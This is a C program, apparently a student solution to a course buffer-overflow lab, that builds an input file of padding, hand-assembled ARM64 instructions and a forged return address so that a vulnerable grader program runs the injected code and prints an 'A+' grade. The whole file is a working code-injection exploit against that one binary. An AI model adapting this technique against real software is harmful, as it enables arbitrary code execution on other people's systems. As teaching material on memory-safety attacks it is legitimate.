/*--------------------------------------------------------------------*/
/* Produces a file called dataAplus with the student name, a          */
/* nullbyte, padding, assembly instructions somewhere else in memory  */
/* to overwrite grade and print out 'A', and padding of null bytes.   */
/* It then jumps back to main to finish the print f statements.       */
/*                                                                    */
/* Authors: Maxwell Lloyd and Venus Dinari                            */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include "miniassembler.h"

int main(void){
   FILE *psFile;
   unsigned long ulData;
   unsigned int ulInstruction;
   unsigned long pAAttack;
   int i;

   psFile = fopen("dataAplus", "w");

   /* Writes the new x30 for getName to skip to our assembly */
   pAAttack = 0x420058;

   /* Changes to be pointing to mov instead of name */
   pAAttack = pAAttack + 12;
   
   /* Writes the student's names */
   ulData = 0x00006E655678614D;
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);

   /* write padding due to newline character conundrum */
   for (i = 0; i < 4; i++)
      putc(0x00, psFile); /* Writes '00000000' */

   /* mov w1, 'A'   */
   ulInstruction = MiniAssembler_mov(1, 65);
   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

   /* adr x0, grade */
   ulInstruction = MiniAssembler_adr(0, 0x420044, pAAttack + 4);
   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

   /* strb w1, [x0] */
   ulInstruction = MiniAssembler_strb(1, 0);
   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

   /* bl printf     */
   ulInstruction = MiniAssembler_bl(0x400690, pAAttack + 12);
   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

   /* mov w1, '+'   */
   ulInstruction = MiniAssembler_mov(1, 43);
   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

   /* adr x0, grade */
   ulInstruction = MiniAssembler_adr(0, 0x420044, pAAttack + 20);
   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

   /* strb w1, [x0] */
   ulInstruction = MiniAssembler_strb(1, 0);
   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

   /* b  printf     */
   ulInstruction = MiniAssembler_b(0x40089c, pAAttack + 28);
   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

   /* Writes the null byte at the end of the instructions */
   for (i = 0; i < 4; i++)
      putc(0x00, psFile); /* Writes '00000000' */

   
   fwrite(&pAAttack, sizeof(unsigned long), 1, psFile);

   fclose(psFile);

   return 0;
}